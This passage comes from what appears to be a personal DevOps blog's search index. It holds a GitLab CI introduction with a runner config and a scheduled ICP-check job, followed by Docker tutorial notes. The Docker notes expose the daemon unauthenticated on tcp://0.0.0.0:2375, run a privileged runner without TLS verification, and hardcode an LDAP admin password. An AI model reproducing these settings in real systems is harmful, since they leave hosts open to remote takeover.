style=\"color:#a6e22e\"\u003edocker\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edns\u003c/span\u003e = [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.185.5\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.185.6\u0026#34;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003etls_verify\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eimage\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;registry.go2cloudten.com/it/office_sop/node:12.13.0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprivileged\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edisable_entrypoint_overwrite\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eoom_kill_disable\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edisable_cache\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eshm_size\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003epull_policy\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;if-not-present\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003evolumes\u003c/span\u003e = [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/cache\u0026#34;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"repository\"\u003eRepository\u003c/h2\u003e\n\u003ch3 id=\"gitlab-ciyaml\"\u003e.gitlab-ci.yaml\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003estages\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003edomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003echeck-icp\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003estage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003edomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eregistry.go2cloudten.com/it/office_sop/icp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etags\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003edocker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003edomains=$(awk -F \u0026#39;|\u0026#39; \u0026#39;{if($6 ~ \u0026#34;Y\u0026#34; \u0026amp;\u0026amp; ($7 ~ \u0026#34;West\u0026#34; || $7 ~ \u0026#34;Yuqu\u0026#34;)) print $3}\u0026#39; domains-info.md | sed \u0026#39;s/ //g\u0026#39; | sort | uniq)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003eif [[ \u0026#34;${domains}\u0026#34; == \u0026#34;\u0026#34; ]]; then telegram.sh \u0026#39;There is no domain in list\u0026#39; ; else telegram.sh \u0026#39;Start checking ICP.\u0026#39; ; fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003efor i in ${domains}; do result=$(checkicp ${i}); if [[ \u0026#34;${result}\u0026#34; == \u0026#34;未备案\u0026#34; ]];then telegram.sh \u0026#34;${i} 未备案\u0026#34;; sleep 1 ;fi;done\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003etelegram.sh \u0026#39;ICP check completed.\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eonly\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003eschedules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Gitlab","introduction","slides","CI"],"title":"Gitlab-CI Introduction"},{"categories":["Docker"],"contents":"Docker Concept VM vs Container VM - Base on OS Container - Base on Application (Linux Kernel: Namespace and Cgroup) Client to Server Docker daemon - containerd, docker-containerd-shim, docker-runc Docker client - cli command docker cli -\u0026gt; docker daemon -\u0026gt; containerd -\u0026gt; runc -\u0026gt; namespace \u0026amp; cgroup Image Snapshots Container Read-Only processes on image Hub / Registry Store images References Docker —— 從入門到實踐 docker docs Docker commands Dockerfile ARG dist=\u0026#34;/tmp/password\u0026#34; ARG projectDir=\u0026#34;/password\u0026#34; FROM golang:1.16-alpine3.14 AS builder RUN apk add build-base upx ARG dist ARG projectDir WORKDIR ${projectDir} COPY . . RUN go build -trimpath -o main cmd/main.go RUN upx -9 -o ${dist} main FROM scratch ARG dist ENV TZ=Asia/Taipei COPY --from=builder ${dist} /usr/local/bin/password Dockerfile1 FROM alpine CMD [\u0026#34;nc\u0026#34;,\u0026#34;-l\u0026#34;,\u0026#34;12345\u0026#34;] Dockerfile2 FROM alpine CMD [\u0026#34;echo\u0026#34;,\u0026#34;DOCKER\u0026#34;] docker build command docker build . -t program docker build . -f Dockerfile -t test_mysql docker build . -t hello:v1.1 --build-arg dist=/tmp/hello --build-arg projectDir=/hello docker build . docker/status echo -e \u0026#34;${GREEN}Before build${RESET}\u0026#34; docker image ls docker build . -f docker/Dockerfile1 -t test1 docker build . -f docker/Dockerfile2 -t test2 docker image . docker/status echo -e \u0026#34;${GREEN}After build${RESET}\u0026#34; docker image ls docker run AND rm . docker/status echo -e \u0026#34;${GREEN}Run container1${RESET}\u0026#34; docker run -d --name container1 test1 echo -e \u0026#34;${GREEN}Run container2${RESET}\u0026#34; docker run -d --name container2 test2 echo -e \u0026#34;${GREEN}List alive containers${RESET}\u0026#34; docker ps echo -e \u0026#34;${GREEN}List all containers${RESET}\u0026#34; docker ps -a echo -e \u0026#34;${GREEN}Remove alive container${RESET}\u0026#34; docker rm -f container1 echo -e \u0026#34;${GREEN}List all containers${RESET}\u0026#34; docker ps -a echo -e \u0026#34;${GREEN}Remove exit container${RESET}\u0026#34; docker rm container2 echo -e \u0026#34;${GREEN}List all containers${RESET}\u0026#34; docker ps -a docker pull AND rmi . docker/status echo -e \u0026#34;${GREEN}List all image${RESET}\u0026#34; docker image ls echo -e \u0026#34;${GREEN}Pull alpine image${RESET}\u0026#34; docker pull alpine echo -e \u0026#34;${GREEN}List all image${RESET}\u0026#34; docker image ls docker rmi . docker/status echo -e \u0026#34;${GREEN}Remove alpine image${RESET}\u0026#34; docker rmi alpine echo -e \u0026#34;${GREEN}List all image${RESET}\u0026#34; docker image ls prune docker system prune -f --volumes docker history . docker/status echo -e \u0026#34;${GREEN}History of test1${RESET}\u0026#34; docker history test1 echo -e \u0026#34;${GREEN}History of mysql:8${RESET}\u0026#34; docker history mysql:8 Docker remote Edit service file # /lib/systemd/system/docker.service ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H tcp://0.0.0.0:2375 Restart service systemctl daemon-reload systemctl restart docker Specify DOCKER_HOST . docker/status echo -e \u0026#34;${GREEN}List images on 192.168.185.9${RESET}\u0026#34; DOCKER_HOST=192.168.185.9:2375 docker images Docker-compose version: \u0026#34;3\u0026#34; services: svn: image: zeyanlin/svn environment: - LDAP_HOSTS=${LDAP_HOSTS} - LDAP_BASE_DN=${LDAP_BASE_DN} - LDAP_BIND_DN=${LDAP_BIND_DN} - LDAP_ADMIN_PASS=${LDAP_ADMIN_PASS} ports: - 8000:80 - 3690:3690 depends_on: - ldap ldap: image: zeyanlin/openldap environment: - LDAP_DOMAIN=${LDAP_DOMAIN} - LDAP_ADMIN_PASS=${LDAP_ADMIN_PASS} ports: - 389:389 - 636:636 php: image: zeyanlin/phpldapadmin environment: - LDAP_HOSTS=${LDAP_HOSTS} ports: - 80:80 depends_on: - ldap Env LDAP_HOSTS=ldap LDAP_DOMAIN=\u0026#34;knowhow.fun\u0026#34; LDAP_BASE_DN=\u0026#34;dc=knowhow,dc=fun\u0026#34; LDAP_BIND_DN=\u0026#34;cn=admin\u0026#34; LDAP_ADMIN_PASS=\u0026#34;123qwe\u0026#34; ","date":"September 17, 2021","hero":"/posts/20210917-docker/docker.jpeg","permalink":"https://linzeyan.github.io/posts/20210917-docker/","summary":"\u003ch1 id=\"docker\"\u003eDocker\u003c/h1\u003e\n\u003ch2 id=\"concept\"\u003eConcept\u003c/h2\u003e\n\u003ch3 id=\"vm-vs-container\"\u003eVM vs Container\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eVM - Base on OS\u003c/li\u003e\n\u003cli\u003eContainer - Base on Application (Linux Kernel: Namespace and Cgroup)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"client-to-server\"\u003eClient to Server\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eDocker daemon - containerd, docker-containerd-shim, docker-runc\u003c/li\u003e\n\u003cli\u003eDocker client - cli command\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edocker cli -\u0026gt; docker daemon -\u0026gt; containerd -\u0026gt; runc -\u0026gt; namespace \u0026amp; cgroup\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"image\"\u003eImage\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSnapshots\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"container\"\u003eContainer\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eRead-Only processes on image\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"hub--registry\"\u003eHub / Registry\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eStore images\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"references\"\u003eReferences\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://philipzheng.gitbook.io/docker_practice/\" target=\"_blank\" rel=\"noopener\"\u003eDocker —— 從入門到實踐\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://docs.docker.com/\" target=\"_blank\" rel=\"noopener\"\u003edocker docs\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"docker-commands\"\u003eDocker commands\u003c/h2\u003e\n\u003ch3 id=\"dockerfile\"\u003eDockerfile\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e dist\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/password\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e projectDir\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/password\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e golang:1.16-alpine3.14 AS builder\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e apk add build-base upx\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e dist\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e projectDir\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eWORKDIR\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e ${projectDir}\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e . .\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e go build -trimpath -o main cmd/main.go\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e upx -9 -o \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003edist\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e main\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e scratch\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e dist\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eENV\u003c/span\u003e TZ\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eAsia/Taipei\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e --from\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebuilder \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003edist\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e /usr/local/bin/password\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"dockerfile1\"\u003eDockerfile1\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e alpine\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCMD\u003c/span\u003e [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nc\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-l\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;12345\u0026#34;\u003c/span\u003e]\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"dockerfile2\"\u003eDockerfile2\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e alpine\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCMD\u003c/span\u003e [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;echo\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DOCKER\u0026#34;\u003c/span\u003e]\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"docker-build-command\"\u003edocker build command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -t program\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -f Dockerfile -t test_mysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -t hello:v1.1 --build-arg dist\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/tmp/hello --build-arg projectDir\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/hello\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-build\"\u003edocker build\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eBefore build\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -f docker/Dockerfile1 -t test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -f docker/Dockerfile2 -t test2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"docker-image\"\u003edocker image\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eAfter build\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-run-and-rm\"\u003edocker run AND rm\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRun container1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run -d --name container1 test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRun container2\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run -d --name container2 test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList alive containers\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker ps\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan 